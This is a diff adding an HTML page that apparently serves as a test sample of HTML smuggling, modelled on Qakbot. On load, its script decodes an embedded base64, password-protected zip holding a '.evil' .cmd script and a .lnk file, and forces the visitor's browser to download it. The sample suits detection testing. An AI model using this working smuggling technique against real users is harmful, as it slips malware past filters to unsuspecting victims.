@@ -1,0 +1,31 @@
+<!-- HTML based on qakbot: https://blog.talosintelligence.com/html-smugglers-turn-to-svg-images/#:~:text=HTML%20smuggling%20is%20a%20technique,directly%20on%20the%20victim's%20device -->
+<html>
+    <head>
+        <title>Just a test</title>
+    </head>
+    <body>
+        <p>Some cool html; much interesting... Password: nwsoc</p>
+
+        <script>
+
+        function getFileObject(b64EncodedString) {
+            var decodedRawData = atob(b64EncodedString);
+            var decodedByteArray = new Uint8Array(decodedRawData.length);
+            for (var i = 0; i < decodedRawData.length; i++) {
+              decodedByteArray[i] = decodedRawData.charCodeAt(i);
+            }
+            return new File([decodedByteArray], "attachment.zip", {type: "application/zip"});
+          }
+        
+          function revokeDownload(file) {
+            var url = URL.createObjectURL(file);
+            window.location.assign(url);
+          }
+        
+          var dummyMaliciousData = "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";
+          var fileObject = getFileObject(dummyMaliciousData);
+          revokeDownload(fileObject);
+        
+        </script>
+    </body>
+</html>
